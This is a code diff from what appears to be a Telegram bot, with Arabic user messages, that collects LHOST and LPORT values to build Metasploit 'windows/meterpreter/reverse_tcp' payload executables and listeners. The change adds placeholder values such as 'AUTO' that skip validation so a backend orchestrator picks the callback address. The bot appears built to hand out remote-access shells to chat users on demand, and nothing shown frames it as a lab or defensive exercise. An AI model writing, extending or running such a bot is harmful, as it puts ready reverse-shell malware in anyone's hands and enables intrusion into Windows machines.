@@ -645,16 +645,26 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("الاستخدام: LHOST LPORT{}".format(" OUTPUT_NAME" if need_output else ""))
             return PARAMS
         lhost, lport = parts[:2]
-        if not _valid_host(lhost) or not _valid_port(lport):
-            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
-            return PARAMS
-        if sess.kind == "payload":
-            output_name = parts[2]
+
+        # Allow placeholders to trigger auto-detection for listener
+        placeholder_host = lhost.upper() in {"LHOST", "AUTO", "ANY"}
+        placeholder_port = lport.upper() in {"LPORT", "AUTO"}
+
+        if sess.kind == "listener" and (placeholder_host or placeholder_port):
             payload = "windows/meterpreter/reverse_tcp"
-            sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
+            # Omit host/port so that orchestrator auto-detects them
+            sess.params = {"payload": payload}
         else:
-            payload = "windows/meterpreter/reverse_tcp"
-            sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
+            if not _valid_host(lhost) or not _valid_port(lport):
+                await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+                return PARAMS
+            if sess.kind == "payload":
+                output_name = parts[2]
+                payload = "windows/meterpreter/reverse_tcp"
+                sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
+            else:
+                payload = "windows/meterpreter/reverse_tcp"
+                sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
     elif sess.kind == "winexe":
         # advanced windows exe
         if len(parts) < 6:
